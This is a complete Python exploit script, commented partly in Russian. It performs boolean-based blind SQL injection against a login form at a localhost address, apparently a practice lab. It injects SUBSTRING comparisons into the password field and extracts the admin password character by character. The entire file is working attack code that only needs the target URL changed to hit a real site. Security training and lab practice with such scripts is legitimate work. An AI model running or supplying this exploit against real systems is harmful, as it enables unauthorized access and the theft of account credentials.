#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://localhost:8082/blind/login"
TARGET_USER = "admin"

session = requests.Session()


def check_condition(position, char):
    # payload: ' AND SUBSTRING(password,1,1)='a'--
    payload = f"' AND SUBSTRING(password,{position},1)='{char}'--"
    data = {
        "username": TARGET_USER,
        "password": payload,
    }

    resp = session.post(BASE_URL, data=data, allow_redirects=True)

    text = resp.text
    status = resp.status_code

    # Для отладки — можно включить:
    # print(position, char, status, len(text))

    # Условие "истина": страница успешного логина
    # (подгони под свой HTML, например ищи 'Login Successful!')
    return status == 200 and "Login Successful" in text


def extract_password(max_len=32):
    charset = string.ascii_letters + string.digits + "_-!@#"
    guessed = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            if check_condition(pos, ch):
                guessed += ch
                print(f"[+] Position {pos}: {ch}")
                found = True
                break
        if not found:
            # дальше символов нет
            break
    return guessed


if __name__ == "__main__":
    print("[*] Extracting admin password using boolean-based blind SQLi")
    pwd = extract_password()
    print(f"[+] Recovered password: {pwd}")
